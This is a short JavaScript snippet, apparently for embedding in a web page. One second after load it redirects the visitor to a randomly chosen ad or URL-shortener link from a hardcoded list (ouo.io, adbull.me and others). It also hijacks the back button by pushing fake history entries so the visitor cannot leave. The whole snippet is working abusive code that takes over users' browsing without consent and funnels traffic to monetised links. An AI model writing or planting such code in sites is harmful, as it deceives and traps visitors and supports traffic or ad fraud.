// 4 ke 1//
var urls = ["https://besargaji.com/RupDJs5lqV5",
              "https://link.bicolink.net/ltzEf2KxH",
              "https://arahlink.id/wk6pCc",
              "https://ouo.io/sB8zhT",
              "https://adbull.me/m3mi",
              "https://to.aoutoqw.xyz/bEmqP",
              "https://go.aoutoqw.xyz/6o6q0NOr"];

  function redirect() {
    var randomIndex = Math.floor(Math.random() * urls.length);
    window.location.replace(urls[randomIndex]);
  }

  if (typeof history.pushState === "function") {
    history.pushState("jibberish", null, null);
    window.addEventListener("popstate", function() {
      history.pushState('newjibberish', null, null);
    });
  }

  window.onload = function() {
    setTimeout(function() {
      redirect();
    }, 1000);
  };
